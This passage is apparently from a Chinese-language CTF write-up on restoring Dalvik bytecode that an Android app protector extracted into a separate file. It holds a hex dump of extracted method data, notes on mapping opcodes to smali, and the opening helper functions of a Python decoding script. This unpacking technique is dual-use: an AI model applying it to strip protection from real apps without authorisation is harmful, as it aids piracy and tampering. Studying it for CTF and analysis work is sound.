class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">数据项1</span><br><span class="line">键: 0x003BEF18</span><br><span class="line">原始大小: 8 (0x08)</span><br><span class="line">数据: 70 10 27 AF 00 00 5B 01 22 73 5B 02 23 73 0E 00 (16字节)</span><br><span class="line"></span><br><span class="line">数据项2</span><br><span class="line">键: 0x003BEF38</span><br><span class="line">原始大小: 8 (0x08)</span><br><span class="line">数据: 54 20 22 73 54 21 23 73 6E 30 63 AD 10 03 0E 00 (16字节)</span><br><span class="line"></span><br><span class="line">数据项3</span><br><span class="line">键: 0x003BF224</span><br><span class="line">原始大小: 4 (0x04)</span><br><span class="line">数据: 70 10 27 AF 00 00 0E 00 (8字节)</span><br><span class="line"></span><br><span class="line">数据项4</span><br><span class="line">键: 0x003BF23C</span><br><span class="line">原始大小: 4 (0x04)</span><br><span class="line">数据: 70 10 27 AF 00 00 0E 00 (8字节)</span><br><span class="line"></span><br><span class="line">数据项5</span><br><span class="line">键: 0x003BF254</span><br><span class="line">原始大小: 4 (0x04)</span><br><span class="line">数据: 70 10 27 AF 00 00 0E 00 (8字节)</span><br><span class="line"></span><br><span class="line">数据项6</span><br><span class="line">键: 0x003BF26C</span><br><span class="line">原始大小: 4 (0x04)</span><br><span class="line">数据: 70 10 27 AF 00 00 0E 00 (8字节)</span><br><span class="line"></span><br><span class="line">数据项7</span><br><span class="line">键: 0x003BF284</span><br><span class="line">原始大小: 4 (0x04)</span><br><span class="line">数据: 70 10 27 AF 00 00 0E 00 (8字节)</span><br><span class="line"></span><br><span class="line">数据项8</span><br><span class="line">键: 0x003BF29C</span><br><span class="line">原始大小: 4 (0x04)</span><br><span class="line">数据: 70 10 27 AF 00 00 0E 00 (8字节)</span><br><span class="line"></span><br><span class="line">数据项9</span><br><span class="line">键: 0x003BF2B4</span><br><span class="line">原始大小: 4 (0x04)</span><br><span class="line">数据: 70 10 27 AF 00 00 0E 00 (8字节)</span><br><span class="line"></span><br><span class="line">数据项10</span><br><span class="line">键: 0x003BF2CC</span><br><span class="line">原始大小: 4 (0x04)</span><br><span class="line">数据: 70 10 27 AF 00 00 0E 00 (8字节)</span><br><span class="line"></span><br><span class="line">数据项11</span><br><span class="line">键: 0x003BF2E4</span><br><span class="line">原始大小: 4 (0x04)</span><br><span class="line">数据: 70 10 27 AF 00 00 0E 00 (8字节)</span><br><span class="line"></span><br><span class="line">数据项12</span><br><span class="line">键: 0x003BF088</span><br><span class="line">原始大小: 38 (0x26)</span><br><span class="line">数据: 13 00 30 00 23 00 E1 1D 26 00 06 00 00 00 69 00 24 73 0E 00 00 03 01 00 30 00 00 00 76 11 07 7C 9D 33 17 85 B2 17 CB 01 2A 6D B3 05 A9 0A B3 6A 4E 64 7B 8A D1 1F 13 38 73 97 F5 DA EE B8 0C 2A 11 37 87 D4 77 D7 57 76 5F B4 AC 45 (76字节)</span><br><span class="line"></span><br><span class="line">数据项13</span><br><span class="line">键: 0x003BF0E4</span><br><span class="line">原始大小: 4 (0x04)</span><br><span class="line">数据: 70 10 E5 16 00 00 0E 00 (8字节)</span><br><span class="line"></span><br><span class="line">数据项14</span><br><span class="line">键: 0x003BF024</span><br><span class="line">原始大小: 41 (0x29)</span><br><span class="line">数据: 38 04 28 00 6E 10 68 AF 04 00 0A 00 38 00 03 00 28 20 12 00 6E 20 51 AF 04 00 0A 00 DF 01 00 05 8E 11 22 02 C8 15 70 10 89 AF 02 00 6E 20 8D AF 12 00 0C 02 12 13 6E 20 79 AF 34 00 0C 03 6E 20 95 AF 32 00 0C 02 6E 10 A5 AF 02 00 0C 02 11 02 11 04 (82字节)</span><br><span class="line"></span><br><span class="line">数据项15</span><br><span class="line">键: 0x003BEFA0</span><br><span class="line">原始大小: 57 (0x39)</span><br><span class="line">数据: 1A 00 09 27 1A 01 09 27 22 02 A4 16 62 03 59 73 6E 20 60 AF 30 00 0C 03 1A 04 AC 36 71 10 5F AD 04 00 0C 04 70 30 50 B3 32 04 22 03 A3 16 62 04 59 73 6E 20 60 AF 41 00 0C 04 70 20 4F B3 43 00 1A 04 AD 36 71 10 5F AD 04 00 0C 04 71 10 4D B3 04 00 0C 04 12 15 6E 40 4E B3 54 32 62 05 59 73 6E 20 60 AF 57 00 0C 05 6E 20 4C B3 54 00 0C 05 11 05 (114字节)</span><br><span class="line"></span><br><span class="line">数据项16</span><br><span class="line">键: 0x003BEF58</span><br><span class="line">原始大小: 27 (0x1B)</span><br><span class="line">数据: 12 00 38 05 19 00 38 06 17 00 21 51 21 62 32 21 03 00 28 11 12 01 21 52 35 21 0C 00 48 02 05 01 48 03 06 01 32 32 03 00 0F 00 D8 01 01 01 28 F4 12 10 0F 00 0F 00 (54字节)</span><br><span class="line"></span><br><span class="line">数据项17</span><br><span class="line">键: 0x003BF1EC</span><br><span class="line">原始大小: 20 (0x14)</span><br><span class="line">数据: 22 00 C2 03 70 20 97 16 30 00 6E 20 A6 16 40 00 0C 00 1A 01 8D 6B 12 02 6E 30 B5 16 10 02 0C 00 6E 10 C1 16 00 00 0E 00 (40字节)</span><br><span class="line"></span><br><span class="line">数据项18</span><br><span class="line">键: 0x003BF0FC</span><br><span class="line">原始大小: 61 (0x3D)</span><br><span class="line">数据: 6E 10 EE 0F 05 00 0C 00 6E 10 2D AF 00 00 0C 00 70 20 60 AD 04 00 0C 01 62 02 24 73 70 30 61 AD 14 02 0A 02 38 02 08 00 1A 02 48 3D 70 20 66 AD 24 00 28 06 1A 02 58 6A 70 20 66 AD 24 00 28 1D 0D 01 22 02 C8 15 70 10 89 AF 02 00 1B 03 43 26 01 00 6E 20 95 AF 32 00 0C 02 6E 10 94 AE 01 00 0C 03 6E 20 95 AF 32 00 0C 02 6E 10 A5 AF 02 00 0C 02 70 20 66 AD 24 00 0E 00 (122字节)</span><br><span class="line"></span><br><span class="line">数据项19</span><br><span class="line">键: 0x003BF198</span><br><span class="line">原始大小: 33 (0x21)</span><br><span class="line">数据: 6F 20 FB 16 43 00 60 00 2B 73 6E 20 65 AD 03 00 60 00 2A 73 6E 20 62 AD 03 00 0C 00 1F 00 92 02 60 01 29 73 6E 20 62 AD 13 00 0C 01 1F 01 8A 02 22 02 56 15 70 30 5B AD 32 00 6E 20 73 0F 21 00 0E 00</span><br></pre></td></tr></table></figure>

<p>用dalvik源码打表，把extract.dat文件完全转为smali</p>
<p>原码地址<a target="_blank" rel="noopener" href="https://github.com/UchihaL/Indroid/blob/master/libdex/DexOpcodes.h">Indroid&#x2F;libdex&#x2F;DexOpcodes.h at master · UchihaL&#x2F;Indroid · GitHub</a></p>
<p>由于我们仅对 extract.dat 这一个文件进行指令还原，还需要从原始的 classes.dex 文件中提取数据，将其中的字符串索引一并还原。</p>
<p>classes.dex解压apk就可以看到。</p>
<p>exp1</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span>, <span class="type">Tuple</span>, <span class="type">List</span>, <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s1_to_s8</span>(<span class="params">x: <span class="built_in">int</span>, bits: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    sign = <span class="number">1</span> &lt;&lt; (bits - <span class="number">1</span>)</span><br><span class="line">    mask = (<span class="number">1</span> &lt;&lt; bits) - <span class="number">1</span></span><br><span class="line">    x &amp;= mask</span><br><span class="line">    <span class="keyword">return</span> (x ^ sign) - sign</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s16</span>(<span class="params">x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&#x27;&lt;h&#x27;</span>, struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, x &amp; <span class="number">0xFFFF</span>))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s32_from_u2</span>(<span class="params">lo: <span class="built_in">int</span>, hi: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    v = (hi &lt;&lt; <span class="number">16</span>) | lo</span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&#x27;&lt;i&#x27;</span>, struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, v))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s64_from_u2</span>(<span class="params">u1: <span class="built_in">int</span>, u2_: <span class="built_in">int</span>, u3: <span class="built_in">int</span>, u4: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span 